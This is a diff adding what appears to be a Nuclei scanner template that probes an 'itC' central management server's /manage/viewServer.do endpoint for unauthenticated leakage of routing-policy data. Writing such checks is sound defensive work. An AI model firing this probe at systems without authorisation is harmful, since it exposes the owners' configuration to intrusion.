@@ -1,0 +1,19 @@
+id: itC-viewServer-unauth
+
+info:
+  name: itC 中心管理服务器 viewServer.do 信息泄露漏洞
+  author: itC
+  severity: medium
+
+http:
+  - raw:
+      - |
+        GET /manage/viewServer.do?type=4 HTTP/1.1
+        Host:{{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+
+
+    matchers:
+          - type: dsl
+            dsl:
+               - status_code==200 && contains_all(body,"RoutingPolicy")
